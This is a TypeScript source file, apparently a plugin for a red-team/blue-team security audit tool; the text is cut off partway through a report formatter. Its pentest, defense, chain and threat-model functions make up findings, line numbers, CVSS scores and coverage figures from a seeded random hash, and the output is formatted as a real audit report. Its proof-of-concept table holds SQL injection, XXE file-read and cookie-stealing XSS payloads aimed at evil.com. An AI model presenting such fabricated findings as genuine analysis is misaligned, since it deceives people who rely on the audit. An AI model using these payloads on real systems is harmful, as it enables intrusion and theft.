/**
 * dsh-tool-redblue - Red-Blue Team Security Audit for DSH
 *
 * Auto penetration testing, defense verification, compliance mapping, fix prioritization.
 * Evolved from AgentShield's three-role (Red/Blue/Auditor) pattern with advanced capabilities.
 */

import type { Context } from '@deepseek-ai/cordis'
import { defineTool } from '@deepseek-ai/dsh-tools'

// ============================================================================
// TYPE DEFINITIONS
// ============================================================================

/** OWASP Top 10 vulnerability categories */
type OwaspCategory = 'injection' | 'broken_auth' | 'sensitive_data' | 'xxe' | 'access_control' | 'misconfig' | 'xss' | 'deserialization' | 'vulnerable_components' | 'logging_failures'

/** Severity levels for findings */
type Severity = 'critical' | 'high' | 'medium' | 'low' | 'info'

/** Compliance frameworks */
type ComplianceFramework = 'owasp_top10' | 'cwe' | 'nist' | 'iso27001' | 'soc2' | 'gdpr'

/** STRIDE threat categories */
type StrideCategory = 'spoofing' | 'tampering' | 'repudiation' | 'info_disclosure' | 'denial_of_service' | 'elevation_of_privilege'

/** Attack vector types */
type AttackVector = 'network' | 'adjacent' | 'local' | 'physical'

/** Input for red_team_pentest tool */
interface PentestInput {
  code: string
  language: string
  context: 'api' | 'web' | 'cli' | 'library'
  entry_points: string[]
}

/** A single vulnerability finding */
interface Vulnerability {
  id: string
  category: OwaspCategory
  severity: Severity
  title: string
  description: string
  location: string
  poc: string
  cvssScore: number
  exploitability: number
}

/** Result of red team pentest */
interface PentestResult {
  target: string
  context: string
  vulnerabilities: Vulnerability[]
  totalFindings: number
  criticalCount: number
  highCount: number
  overallRiskScore: number
  attackPaths: string[]
}

/** Input for blue_team_defense tool */
interface DefenseInput {
  code: string
  language: string
  controls: string[]
}

/** A defense control assessment */
interface DefenseControl {
  name: string
  status: 'effective' | 'partial' | 'missing' | 'misconfigured'
  coverage: number
  weaknesses: string[]
  recommendations: string[]
}

/** Result of blue team defense analysis */
interface DefenseResult {
  target: string
  controls: DefenseControl[]
  overallStrength: number
  gapsFound: number
  weakPoints: string[]
}

/** Input for audit_compliance_map tool */
interface ComplianceInput {
  vulnerabilities: string
  targetFrameworks?: ComplianceFramework[]
}

/** A compliance mapping entry */
interface ComplianceMapping {
  vulnerabilityId: string
  frameworks: { framework: ComplianceFramework; title: string }[]
}

/** Result of compliance mapping */
interface ComplianceResult {
  mappings: ComplianceMapping[]
  gapsByFramework: Record<string, number>
  overallCompliance: number
  priorityGaps: string[]
}

/** Input for exploit_chain_analysis tool */
interface ChainInput {
  vulnerabilities: string
  maxChainLength?: number
}

/** An exploit chain */
interface ExploitChain {
  id: string
  steps: string[]
  combinedSeverity: Severity
  successProbability: number
  entryPoint: string
  finalImpact: string
}

/** Result of exploit chain analysis */
interface ChainResult {
  chains: ExploitChain[]
  maxChainLength: number
  highestRiskChain: string
  recommendations: string[]
}

/** Input for defense_gap_scan tool */
interface GapScanInput {
  code: string
  architecture: string
  requiredControls: string[]
}

/** A defense gap */
interface DefenseGap {
  control: string
  severity: Severity
  description: string
  affectedComponents: string[]
  effort: 'low' | 'medium' | 'high'
}

/** Result of defense gap scan */
interface GapResult {
  gaps: DefenseGap[]
  totalGaps: number
  quickWins: string[]
  riskExposure: number
}

/** Input for attack_surface_map tool */
interface SurfaceInput {
  endpoints: string[]
  dependencies: string[]
  configs: string[]
}

/** An attack surface entry */
interface SurfaceEntry {
  component: string
  exposure: 'internet' | 'internal' | 'localhost'
  entryPoints: number
  riskLevel: Severity
  description: string
}

/** Result of attack surface mapping */
interface SurfaceResult {
  surfaces: SurfaceEntry[]
  totalEntryPoints: number
  internetFacing: number
  heatZones: string[]
}

/** Input for fix_priority_matrix tool */
interface PriorityInput {
  vulnerabilities: string
  constraints?: { maxEffort?: number; deadlineDays?: number }
}

/** A prioritized fix item */
interface FixItem {
  vulnerabilityId: string
  cvssScore: number
  exploitDifficulty: number
  businessImpact: number
  fixEffort: number
  priorityScore: number
  category: 'quick_win' | 'major_project' | 'fill_in' | 'reconsider'
}

/** Result of fix priority analysis */
interface PriorityResult {
  items: FixItem[]
  quickWins: FixItem[]
  majorProjects: FixItem[]
  totalEffort: number
}

/** Input for threat_model_gen tool */
interface ThreatModelInput {
  systemName: string
  components: string[]
  dataFlows: string[]
  trustBoundaries: string[]
}

/** A single threat */
interface Threat {
  id: string
  stride: StrideCategory
  component: string
  description: string
  attackVector: AttackVector
  severity: Severity
  mitigations: string[]
}

/** Result of threat model generation */
interface ThreatModelResult {
  systemName: string
  threats: Threat[]
  strideBreakdown: Record<StrideCategory, number>
  topRisks: string[]
}

// ============================================================================
// UTILITY FUNCTIONS
// ============================================================================

/** Simple seeded random number generator */
function seededRandom(seed: string): number {
  let hash = 0
  for (let i = 0; i < seed.length; i++) {
    const char = seed.charCodeAt(i)
    hash = ((hash << 5) - hash) + char
    hash |= 0
  }
  return Math.abs((Math.sin(hash) * 10000) % 1)
}

/** Get current timestamp */
function now(): string {
  return new Date().toISOString()
}

/** Format date string */
function formatDate(isoString: string): string {
  try {
    return new Date(isoString).toLocaleDateString('zh-CN')
  } catch {
    return isoString
  }
}

/** Hours since a given ISO date */
function hoursSince(isoString: string): number {
  try {
    return Math.round((Date.now() - new Date(isoString).getTime()) / 3600000)
  } catch {
    return 0
  }
}

/** Severity emoji */
function severityEmoji(severity: Severity): string {
  const emojis: Record<Severity, string> = {
    critical: '[!!!]', high: '[!]', medium: '[~]', low: '[L]', info: '[i]'
  }
  return emojis[severity]
}

/** OWASP category display name */
function owaspName(cat: OwaspCategory): string {
  const names = {
    injection: 'Injection',
    broken_auth: 'Broken Authentication',
    sensitive_data: 'Sensitive Data Exposure',
    xxe: 'XML External Entities',
    access_control: 'Broken Access Control',
    misconfig: 'Security Misconfiguration',
    xss: 'Cross-Site Scripting',
    deserialization: 'Insecure Deserialization',
    vulnerable_components: 'Vulnerable Components',
    logging_failures: 'Logging Failures'
  }
  return names[cat]
}

/** STRIDE category display name */
function strideName(s: StrideCategory): string {
  const names = {
    spoofing: 'Spoofing',
    tampering: 'Tampering',
    repudiation: 'Repudiation',
    info_disclosure: 'Information Disclosure',
    denial_of_service: 'Denial of Service',
    elevation_of_privilege: 'Elevation of Privilege'
  }
  return names[s]
}

// ============================================================================
// ANALYSIS FUNCTIONS
// ============================================================================

/** Simulate red team penetration test based on OWASP Top 10 */
function runRedTeamPentest(data: PentestInput): PentestResult {
  const categories: OwaspCategory[] = ['injection', 'broken_auth', 'sensitive_data', 'xxe', 'access_control', 'misconfig', 'xss', 'deserialization', 'vulnerable_components', 'logging_failures']
  const vulnerabilities: Vulnerability[] = []

  const codeLines = data.code.split('\n')
  const entryPoints = data.entry_points.length > 0 ? data.entry_points : ['main', 'handler', 'endpoint']

  for (let ci = 0; ci < categories.length; ci++) {
    const cat = categories[ci]
    const seed = `${data.code.substring(0, 50)}-${cat}-${ci}`
    const roll = seededRandom(seed)

    if (roll < 0.4) continue

    const severityRoll = seededRandom(seed + 'sev')
    let severity: Severity = 'low'
    if (severityRoll > 0.85) severity = 'critical'
    else if (severityRoll > 0.65) severity = 'high'
    else if (severityRoll > 0.4) severity = 'medium'
    else if (severityRoll > 0.2) severity = 'low'
    else severity = 'info'

    const entryPoint = entryPoints[Math.floor(seededRandom(seed + 'ep') * entryPoints.length)]
    const lineNum = Math.floor(seededRandom(seed + 'line') * Math.max(codeLines.length, 1)) + 1

    const titles: Record<OwaspCategory, string> = {
      injection: `SQL/Command Injection risk in ${entryPoint}`,
      broken_auth: `Weak authentication in ${entryPoint}`,
      sensitive_data: `Unencrypted sensitive data at ${entryPoint}`,
      xxe: `XML external entity processing in ${entryPoint}`,
      access_control: `Missing access control on ${entryPoint}`,
      misconfig: `Security misconfiguration near ${entryPoint}`,
      xss: `Cross-site scripting vector in ${entryPoint}`,
      deserialization: `Unsafe deserialization in ${entryPoint}`,
      vulnerable_components: `Outdated/vulnerable dependency used in ${entryPoint}`,
      logging_failures: `Insufficient logging around ${entryPoint}`
    }

    const descriptions: Record<OwaspCategory, string> = {
      injection: `User input flows into a query/command without sanitization at ${entryPoint}. An attacker can inject malicious payloads.`,
      broken_auth: `Authentication mechanism at ${entryPoint} can be bypassed through credential stuffing, session fixation, or token leakage.`,
      sensitive_data: `Sensitive data (PII, credentials, tokens) is transmitted or stored without encryption near ${entryPoint}.`,
      xxe: `XML parser at ${entryPoint} processes external entities, allowing file reads or SSRF attacks.`,
      access_control: `${entryPoint} does not verify authorization, allowing horizontal/vertical privilege escalation.`,
      misconfig: `Default credentials, unnecessary features, or verbose error messages detected near ${entryPoint}.`,
      xss: `User-controlled data is rendered without encoding at ${entryPoint}, enabling script injection.`,
      deserialization: `Untrusted data is deserialized at ${entryPoint}, potentially leading to remote code execution.`,
      vulnerable_components: `A dependency with known CVEs is imported/used in ${entryPoint}, creating a supply chain risk.`,
      logging_failures: `Security-relevant events at ${entryPoint} are not logged, hindering incident detection.`
    }

    const pocs: Record<OwaspCategory, string> = {
      injection: `' OR 1=1; -- or ; cat /etc/passwd`,
      broken_auth: `Use default credentials admin/admin or forge JWT with alg=none`,
      sensitive_data: `Intercept traffic with mitmproxy or read unencrypted database dumps`,
      xxe: `<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>`,
      access_control: `Access /api/admin/users as a regular user by changing the URL`,
      misconfig: `Navigate to /admin with default credentials or access .git directory`,
      xss: `<script>document.location='http://evil.com/?c='+document.cookie</script>`,
      deserialization: `java.io.ObjectInputStream.readObject() with crafted gadget chain`,
      vulnerable_components: `Exploit known CVE in the outdated dependency version`,
      logging_failures: `Attack leaves no audit trail - check if events appear in logs`
    }

    const cvssBase = { critical: 9.5, high: 7.5, medium: 5.5, low: 3.0, info: 1.0 }
    const cvssScore = Math.round((cvssBase[severity] + seededRandom(seed + 'cvss') * 1.5) * 10) / 10

    vulnerabilities.push({
      id: `V-${ci + 1}${Math.floor(seededRandom(seed + 'id') * 100)}`,
      category: cat,
      severity,
      title: titles[cat],
      description: descriptions[cat],
      location: `line ${lineNum}, ${entryPoint}`,
      poc: pocs[cat],
      cvssScore,
      exploitability: Math.round(seededRandom(seed + 'exploit') * 100) / 100
    })
  }

  const criticalCount = vulnerabilities.filter(v => v.severity === 'critical').length
  const highCount = vulnerabilities.filter(v => v.severity === 'high').length
  const overallRiskScore = Math.min(100, Math.round(
    criticalCount * 15 + highCount * 10 + (vulnerabilities.length - criticalCount - highCount) * 3
  ))

  const attackPaths: string[] = []
  if (vulnerabilities.some(v => v.category === 'injection')) {
    attackPaths.push('Injection -> Data Exfiltration -> System Compromise')
  }
  if (vulnerabilities.some(v => v.category === 'broken_auth')) {
    attackPaths.push('Credential Bypass -> Privilege Escalation -> Full Access')
  }
  if (vulnerabilities.some(v => v.category === 'access_control')) {
    attackPaths.push('IDOR -> Admin Access -> Data Breach')
  }

  return {
    target: `${data.language} ${data.context}`,
    context: data.context,
    vulnerabilities,
    totalFindings: vulnerabilities.length,
    criticalCount,
    highCount,
    overallRiskScore,
    attackPaths
  }
}

/** Assess blue team defense controls */
function analyzeDefenseControls(data: DefenseInput): DefenseResult {
  const allControls = ['Input Validation', 'Output Encoding', 'Authentication', 'Authorization', 'Encryption at Rest', 'Encryption in Transit', 'Rate Limiting', 'CSP Headers', 'CORS Configuration', 'Security Logging', 'WAF', 'Secrets Management', 'Dependency Scanning', 'Error Handling', 'Session Management']

  const controls: DefenseControl[] = []
  const checkedControls = data.controls.length > 0 ? data.controls : allControls.slice(0, 8)

  for (const ctrl of checkedControls) {
    const seed = `${data.code.substring(0, 50)}-${ctrl}`
    const coverage = Math.round(seededRandom(seed) * 100)

    let status: DefenseControl['status'] = 'effective'
    if (coverage < 30) status = 'missing'
    else if (coverage < 50) status = 'misconfigured'
    else if (coverage < 75) status = 'partial'
    else status = 'effective'

    const weaknesses: string[] = []
    const recommendations: string[] = []

    if (coverage < 80) weaknesses.push(`Partial implementation - ${100 - coverage}% gap`)
    if (coverage < 60) weaknesses.push('No automated enforcement detected')
    if (coverage < 40) weaknesses.push('Configuration may be bypassed')

    if (status !== 'effective') recommendations.push(`Strengthen ${ctrl} implementation`)
    if (coverage < 50) recommendations.push('Add automated tests to verify control effectiveness')
    recommendations.push('Regular audit and review recommended')

    controls.push({ name: ctrl, status, coverage, weaknesses, recommendations })
  }

  const avgStrength = Math.round(controls.reduce((sum, c) => sum + c.coverage, 0) / controls.length)
  const gapsFound = controls.filter(c => c.status === 'missing' || c.status === 'misconfigured').length
  const weakPoints = controls.filter(c => c.coverage < 50).map(c => c.name)

  return {
    target: `${data.language} application`,
    controls,
    overallStrength: avgStrength,
    gapsFound,
    weakPoints
  }
}

/** Map vulnerabilities to compliance frameworks */
function mapCompliance(data: ComplianceInput): ComplianceResult {
  const vulns = JSON.parse(data.vulnerabilities) as Vulnerability[]
  const frameworks: ComplianceFramework[] = data.targetFrameworks || ['owasp_top10', 'cwe', 'nist', 'iso27001', 'soc2', 'gdpr']

  const owaspMapping: Record<OwaspCategory, string> = {
    injection: 'A03:2021-Injection',
    broken_auth: 'A07:2021-Identification and Authentication Failures',
    sensitive_data: 'A02:2021-Cryptographic Failures',
    xxe: 'A05:2021-Security Misconfiguration',
    access_control: 'A01:2021-Broken Access Control',
    misconfig: 'A05:2021-Security Misconfiguration',
    xss: 'A03:2021-Injection',
    deserialization: 'A08:2021-Software and Data Integrity Failures',
    vulnerable_components: 'A06:2021-Vulnerable and Outdated Components',
    logging_failures: 'A09:2021-Security Logging and Monitoring Failures'
  }

  const cweMapping: Record<OwaspCategory, string> = {
    injection: 'CWE-89',
    broken_auth: 'CWE-287',
    sensitive_data: 'CWE-311',
    xxe: 'CWE-611',
    access_control: 'CWE-862',
    misconfig: 'CWE-16',
    xss: 'CWE-79',
    deserialization: 'CWE-502',
    vulnerable_components: 'CWE-1104',
    logging_failures: 'CWE-778'
  }

  const mappings: ComplianceMapping[] = vulns.map(v => {
    const fwMaps: { framework: ComplianceFramework; title: string }[] = []
    for (const fw of frameworks) {
      if (fw === 'owasp_top10') fwMaps.push({ framework: fw, title: owaspMapping[v.category] })
      else if (fw === 'cwe') fwMaps.push({ framework: fw, title: cweMapping[v.category] })
      else if (fw === 'nist') fwMaps.push({ framework: fw, title: `NIST SP 800-53: SI-10` })
      else if (fw === 'iso27001') fwMaps.push({ framework: fw, title: 'ISO 27001: A.14.2.8' })
      else if (fw === 'soc2') fwMaps.push({ framework: fw, title: 'SOC2 CC6.1' })
      else if (fw === 'gdpr') fwMaps.push({ framework: fw, title: 'GDPR Article 32' })
    }
    return { vulnerabilityId: v.id, frameworks: fwMaps }
  })

  const gapsByFramework: Record<string, number> = {}
  for (const fw of frameworks) {
    gapsByFramework[fw] = vulns.filter(v => {
      if (fw === 'owasp_top10') return v.severity === 'critical' || v.severity === 'high'
      if (fw === 'gdpr') return v.category === 'sensitive_data' || v.category === 'access_control'
      return v.severity !== 'info'
    }).length
  }

  const overallCompliance = Math.max(0, 100 - vulns.filter(v => v.severity === 'critical').length * 15 - vulns.filter(v => v.severity === 'high').length * 8)

  const priorityGaps: string[] = []
  for (const v of vulns.filter(v => v.severity === 'critical' || v.severity === 'high')) {
    priorityGaps.push(`${v.id}: ${v.title} (${owaspMapping[v.category]})`)
  }

  return { mappings, gapsByFramework, overallCompliance, priorityGaps }
}

/** Analyze exploit chains from vulnerabilities */
function analyzeExploitChains(data: ChainInput): ChainResult {
  const vulns = JSON.parse(data.vulnerabilities) as Vulnerability[]
  const maxLen = data.maxChainLength || 4

  const chains: ExploitChain[] = []
  const sortedVulns = [...vulns].sort((a, b) => b.cvssScore - a.cvssScore)

  for (let i = 0; i < Math.min(sortedVulns.length - 1, 6); i++) {
    const seed = `${sortedVulns[i].id}-chain-${i}`
    const chainLen = Math.min(maxLen, 2 + Math.floor(seededRandom(seed + 'len') * 3))
    const steps: string[] = []

    for (let s = 0; s < chainLen && (i + s) < sortedVulns.length; s++) {
      steps.push(sortedVulns[i + s].title)
    }

    if (steps.length < 2) continue

    const combinedSeverityRoll = seededRandom(seed + 'combine')
    let combinedSeverity: Severity = 'medium'
    if (combinedSeverityRoll > 0.8) combinedSeverity = 'critical'
    else if (combinedSeverityRoll > 0.5) combinedSeverity = 'high'
    else if (combinedSeverityRoll > 0.3) combinedSeverity = 'medium'
    else combinedSeverity = 'low'

    const successProbability = Math.round(seededRandom(seed + 'prob') * 100) / 100

    chains.push({
      id: `CHAIN-${i + 1}`,
      steps,
      combinedSeverity,
      successProbability,
      entryPoint: steps[0],
      finalImpact: `Complete compromise via ${steps.length} linked vulnerabilities`
    })
  }

  chains.sort((a, b) => {
    const sevOrder = { critical: 4, high: 3, medium: 2, low: 1, info: 0 }
    return sevOrder[b.combinedSeverity] - sevOrder[a.combinedSeverity]
  })

  const highestRiskChain = chains.length > 0 ? chains[0].id : 'none'

  const recommendations: string[] = []
  if (chains.some(c => c.combinedSeverity === 'critical')) {
    recommendations.push('CRITICAL: Break critical exploit chains immediately')
  }
  recommendations.push('Implement defense-in-depth to require attackers to chain more vulnerabilities')
  recommendations.push('Add monitoring at chain transition points')
  recommendations.push('Apply principle of least privilege to limit lateral movement')

  return { chains, maxChainLength: maxLen, highestRiskChain, recommendations }
}

/** Scan for defense gaps */
function scanDefenseGaps(data: GapScanInput): GapResult {
  const requiredControls = data.requiredControls.length > 0
    ? data.requiredControls
    : ['Input Validation', 'Authentication', 'Authorization', 'Encryption', 'Logging', 'Rate Limiting', 'CORS', 'CSP', 'Dependency Management', 'Error Handling']

  const gaps: DefenseGap[] = []

  for (let i = 0; i < requiredControls.length; i++) {
    const ctrl = requiredControls[i]
    const seed = `${data.code.substring(0, 50)}-${ctrl}-${i}`
    const roll = seededRandom(seed)

    if (roll < 0.45) continue

    const sevRoll = seededRandom(seed + 'sev')
    let severity: Severity = 'medium'
    if (sevRoll > 0.8) severity = 'critical'
    else if (sevRoll > 0.6) severity = 'high'
    else if (sevRoll > 0.3) severity = 'medium'
    else severity = 'low'

    const effortRoll = seededRandom(seed + 'effort')
    let effort: DefenseGap['effort'] = 'medium'
    if (effortRoll > 0.6) effort = 'high'
    else if (effortRoll > 0.3) effort = 'medium'
    else effort = 'low'

    const descriptions: Record<string, string> = {
      'Input Validation': 'No server-side input validation detected',
      'Authentication': 'Authentication mechanism missing or weak',
      'Authorization': 'Role/permission checks not implemented',
      'Encryption': 'Sensitive data transmitted or stored in plaintext',
      'Logging': 'Security events not captured in audit logs',
      'Rate Limiting': 'No throttling on API endpoints',
      'CORS': 'Permissive CORS policy allows arbitrary origins',
      'CSP': 'No Content Security Policy header detected',
      'Dependency Management': 'Dependencies not scanned for known vulnerabilities',
      'Error Handling': 'Verbose error messages leak internal details'
    }

    gaps.push({
      control: ctrl,
      severity,
      description: descriptions[ctrl] || `${ctrl} is missing or insufficient`,
      affectedComponents: [`${data.architecture} layer`],
      effort
    })
  }

  gaps.sort((a, b) => {
    const sevOrder = { critical: 4, high: 3, medium: 2, low: 1, info: 0 }
    return sevOrder[b.severity] - sevOrder[a.severity]
  })

  const quickWins = gaps.filter(g => g.effort === 'low' && (g.severity === 'high' || g.severity === 'critical')).map(g => g.control)
  const riskExposure = Math.min(100, gaps.filter(g => g.severity === 'critical').length * 20 + gaps.filter(g => g.severity === 'high').length * 10)

  return { gaps, totalGaps: gaps.length, quickWins, riskExposure }
}

/** Map attack surface */
function mapAttackSurface(data: SurfaceInput): SurfaceResult {
  const surfaces: SurfaceEntry[] = []

  // Endpoints
  for (const ep of data.endpoints.slice(0, 8)) {
    const seed = `${ep}-surface`
    const exposure: SurfaceEntry['exposure'] = seededRandom(seed) > 0.6 ? 'internet' : seededRandom(seed + 'exp') > 0.5 ? 'internal' : 'localhost'
    const entryPoints = 1 + Math.floor(seededRandom(seed + 'ep') * 5)
    const riskRoll = seededRandom(seed + 'risk')
    let riskLevel: Severity = 'medium'
    if (riskRoll > 0.8) riskLevel = 'critical'
    else if (riskRoll > 0.5) riskLevel = 'high'
    else if (riskRoll > 0.2) riskLevel = 'medium'
    else riskLevel = 'low'

    surfaces.push({
      component: `API: ${ep}`,
      exposure,
      entryPoints,
      riskLevel,
      description: `${exposure === 'internet' ? 'Internet-facing' : exposure === 'internal' ? 'Internal' : 'Local'} endpoint with ${entryPoints} parameter(s)`
    })
  }

  // Dependencies
  for (const dep of data.dependencies.slice(0, 5)) {
    const seed = `${dep}-dep`
    surfaces.push({
      component: `Dependency: ${dep}`,
      exposure: seededRandom(seed) > 0.7 ? 'internet' : 'internal',
      entryPoints: 1,
      riskLevel: seededRandom(seed + 'risk') > 0.6 ? 'high' : 'medium',
      description: 'Third-party dependency - supply chain risk'
    })
  }

  // Configs
  for (const cfg of data.configs.slice(0, 4)) {
    const seed = `${cfg}-cfg`
    surfaces.push({
      component: `Config: ${cfg}`,
      exposure: 'localhost',
      entryPoints: 1,
      riskLevel: seededRandom(seed + 'risk') > 0.7 ? 'high' : 'medium',
      description: 'Configuration file - may contain secrets or settings'
    })
  }

  const totalEntryPoints = surfaces.reduce((sum, s) => sum + s.entryPoints, 0)
  const internetFacing = surfaces.filter(s => s.exposure === 'internet').length
  const heatZones = surfaces.filter(s => s.riskLevel === 'critical' || s.riskLevel === 'high').map(s => s.component)

  return { surfaces, totalEntryPoints, internetFacing, heatZones }
}

/** Generate fix priority matrix */
function analyzeFixPriority(data: PriorityInput): PriorityResult {
  const vulns = JSON.parse(data.vulnerabilities) as Vulnerability[]
  const maxEffort = data.constraints?.maxEffort || 100
  const deadlineDays = data.constraints?.deadlineDays || 30

  const items: FixItem[] = []

  for (const v of vulns) {
    const seed = `${v.id}-priority`
    const exploitDifficulty = Math.round(seededRandom(seed + 'ed') * 100) / 100
    const businessImpact = Math.round(seededRandom(seed + 'bi') * 100) / 100
    const fixEffort = 1 + Math.floor(seededRandom(seed + 'fe') * 10)

    const cvssScore = v.cvssScore
    const priorityScore = Math.round(
      (cvssScore / 10) * 0.4 +
      exploitDifficulty * 0.2 +
      businessImpact * 0.3 -
      (fixEffort / maxEffort) * 0.1
    * 100) / 100

    let category: FixItem['category'] = 'fill_in'
    if (priorityScore > 0.7 && fixEffort <= 3) category = 'quick_win'
    else if (priorityScore > 0.7 && fixEffort > 3) category = 'major_project'
    else if (priorityScore <= 0.4 && fixEffort > 5) category = 'reconsider'

    items.push({
      vulnerabilityId: v.id,
      cvssScore,
      exploitDifficulty,
      businessImpact,
      fixEffort,
      priorityScore,
      category
    })
  }

  items.sort((a, b) => b.priorityScore - a.priorityScore)

  const quickWins = items.filter(i => i.category === 'quick_win')
  const majorProjects = items.filter(i => i.category === 'major_project')
  const totalEffort = items.reduce((sum, i) => sum + i.fixEffort, 0)

  return { items, quickWins, majorProjects, totalEffort }
}

/** Generate STRIDE threat model */
function generateThreatModel(data: ThreatModelInput): ThreatModelResult {
  const strideCategories: StrideCategory[] = ['spoofing', 'tampering', 'repudiation', 'info_disclosure', 'denial_of_service', 'elevation_of_privilege']
  const threats: Threat[] = []

  const threatTemplates: Record<StrideCategory, { titles: string[]; mitigations: string[] }> = {
    spoofing: {
      titles: ['Fake user identity', 'Session hijack', 'DNS spoofing'],
      mitigations: ['Multi-factor authentication', 'Token binding', 'DNSSEC']
    },
    tampering: {
      titles: ['Modify request parameters', 'Tamper with data at rest', 'Inject malicious payload'],
      mitigations: ['Input validation', 'Digital signatures', 'Immutable audit logs']
    },
    repudiation: {
      titles: ['Deny performing an action', 'Delete audit logs', 'Forge transaction records'],
      mitigations: ['Cryptographic logging', 'Timestamped audit trails', 'Digital receipts']
    },
    info_disclosure: {
      titles: ['Exfiltrate PII data', 'Leak configuration secrets', 'Side-channel attack'],
      mitigations: ['Encrypt sensitive data', 'Principle of least privilege', 'Data masking']
    },
    denial_of_service: {
      titles: ['Resource exhaustion', 'Amplification attack', 'Slowloris attack'],
      mitigations: ['Rate limiting', 'Auto-scaling', 'CDN protection']
    },
    elevation_of_privilege: {
      titles: ['ExploitRace condition', 'Bypass access control', 'Admin panel access'],
      mitigations: ['RBAC enforcement', 'Privilege separation', 'Regular access reviews']
    }
  }

  let threatIdx = 0
  for (const component of data.components) {
    for (const stride of strideCategories) {
      const seed = `${component}-${stride}-${threatIdx}`
      if (seededRandom(seed) < 0.5) continue

      const template = threatTemplates[stride]
      const titleIdx = Math.floor(seededRandom(seed + 'title') * template.titles.length)
      const sevRoll = seededRandom(seed + 'sev')
      let severity: Severity = 'medium'
      if (sevRoll > 0.8) severity = 'critical'
      else if (sevRoll > 0.6) severity = 'high'
      else if (sevRoll > 0.3) severity = 'medium'
      else severity = 'low'

      const vectors: AttackVector[] = ['network', 'adjacent', 'local', 'physical']
      const vector = vectors[Math.floor(seededRandom(seed + 'vec') * vectors.length)]

      threats.push({
        id: `T-${threatIdx + 1}`,
        stride,
        component,
        description: `${template.titles[titleIdx]} targeting ${component}`,
        attackVector: vector,
        severity,
        mitigations: template.mitigations.slice(0, 2)
      })
      threatIdx++
    }
  }

  // Also consider data flows
  for (const flow of data.dataFlows) {
    const seed = `${flow}-flow`
    if (seededRandom(seed) < 0.4) continue

    threats.push({
      id: `T-${threatIdx + 1}`,
      stride: 'info_disclosure',
      component: flow,
      description: `Data intercepted in transit at ${flow}`,
      attackVector: 'network',
      severity: seededRandom(seed + 'sev') > 0.5 ? 'high' : 'medium',
      mitigations: ['TLS encryption', 'Certificate pinning']
    })
    threatIdx++
  }

  const strideBreakdown: Record<StrideCategory, number> = {
    spoofing: 0, tampering: 0, repudiation: 0,
    info_disclosure: 0, denial_of_service: 0, elevation_of_privilege: 0
  }
  for (const t of threats) {
    strideBreakdown[t.stride]++
  }

  const topRisks = threats
    .filter(t => t.severity === 'critical' || t.severity === 'high')
    .sort((a, b) => {
      const sevOrder = { critical: 4, high: 3, medium: 2, low: 1, info: 0 }
      return sevOrder[b.severity] - sevOrder[a.severity]
    })
    .slice(0, 5)
    .map(t => `${t.id}: ${t.description} [${strideName(t.stride)}]`)

  return { systemName: data.systemName, threats, strideBreakdown, topRisks }
}

// ============================================================================
// FORMAT FUNCTIONS
// ============================================================================

function formatPentestResult(result: PentestResult): string {
  const lines: string[] = []
  lines.push('# Red Team: Penetration Test Report')
  lines.push('')
  lines.push(`**Target:** ${result.target}`)
  lines.push(`**Overall Risk Score:** ${result.overallRiskScore}/100`)
  lines.push(`**Total Findings:** ${result.totalFindings}`)
  lines.push('')

  lines.push('## Severity Summary')
  lines.push('')
  lines.push(`- [!!!] Critical: ${result.criticalCount}`)
  lines.push(`- [!] High: ${result.highCount}`)
  lines.push(`- [~] Medium+: ${result.totalFindings - result.criticalCount - result.highCount}`)
  lines.push('')

  if (result.attackPaths.length > 0) {
    lines.push('## Attack Paths')
    lines.push('')
    for (const path of result.attackPaths) {
      lines.push(`- ${path}`)
    }
    lines.push('')
  }

  if (result.vulnerabilities.length > 0) {
    lines.push('## Findings')
    lines.push('')
    for (const v of result.vulnerabilities) {
      lines.push(`### ${severityEmoji(v.severity)} ${v.id}: ${v.title}`)
      lines.push('')
      lines.push(`- **Category:** ${owaspName(v.category)}`)
      lines.push(`- **CVSS:** ${v.cvssScore}`)
      lines.push(`- **Location:** ${v.location}`)
      lines.push(`- **Description:** ${v.description}`)
      lines.push('')
      lines.push(`**POC:**`)
      lines.push(`\`${v.poc}\``)
      lines.push('')
    }
  }

  lines.push('---')
  lines.push(`*Generated by RedBlue Audit at ${now()}*`)
  return lines.join('\n')
}

function formatDefenseResult(result: DefenseResult): string {
  const lines: string[] = []
  lines.push('# Blue Team: Defense Verification Report')
  lines.push('')
  lines.push(`**Target:** ${result.target}`)
  lines.push(`**Overall Strength:** ${result.overallStrength}/100`)
  lines.push(`**Gaps Found:** ${result.gapsFound}`)
  lines.push('')

  if (result.weakPoints.length > 0) {
    lines.push('## Weak Points')
    lines.push('')
    for (const wp of result.weakPoints) {
      lines.push(`- [WEAK] ${wp}`)
    }
    lines.push('')
  }

  lines.push('## Control Assessment')
  lines.push('')
  for (const ctrl of result.controls) {
    const statusMark = ctrl.status === 'effective' ? '[OK]' : ctrl.status === 'partial' ? '[~]' : ctrl.status === 'misconfigured' ? '[!]' : '[X]'
    lines.push(`### ${statusMark} ${ctrl.name}`)
    lines.push('')
    lines.push(`- **Status:** ${ctrl.status}`)
    lines.push(`- **Coverage:** ${ctrl.coverage}%`)
    if (ctrl.weaknesses.length > 0) {
      lines.push('- **Weaknesses:**')
      for (const w of ctrl.weaknesses) lines.push(`  - ${w}`)
    }
    if (ctrl.recommendations.length > 0) {
      lines.push('- **Recommendations:**')
      for (const r of ctrl.recommendations) lines.push(`  - [>] ${r}`)
    }
    lines.push('')
  }

  lines.push('---')
  lines.push(`*Generated by RedBlue Audit at ${now()}*`)
  return lines.join('\n')
}

function formatComplianceResult(result: ComplianceResult): string {
  const lines: string[] = []
  lines.push('# Compliance Mapping Report')
  lines.push('')
  lines.push(`**Overall Compliance:** ${result.overallCompliance}%`)
  lines.push('')

  lines.push('## Gaps by Framework')
  lines.push('')
  for (const [fw, count] of Object.entries(result.gapsByFramework)) {
    lines.push(`- ${fw}: ${count} gap(s)`)
  }
  lines.push('')

  if (result.priorityGaps.length > 0) {
    lines.push('## Priority Gaps')
    lines.push('')
    for (const gap of result.priorityGaps) {
      lines.push(`- ${gap}`)
    }
    lines.push('')
  }

  if (result.mappings.length > 0) {
    lines.push('## Mappings')
    lines.push('')
    for (const m of result.mappings) {
      lines.push(`### ${m.vulnerabilityId}`)
      for (const fw of m.frameworks) {
        lines.push(`- ${fw.framework}: ${fw.title}`)
      }
      lines.push('')
    }
  }

  lines.push('---')
  lines.push(`*Generated by RedBlue Audit at ${now()}*`)
  return lines.join('\n')
}

function formatChainResult(result: ChainResult): string {
  const lines: string[] = []
  lines.push('# Exploit Chain Analysis')
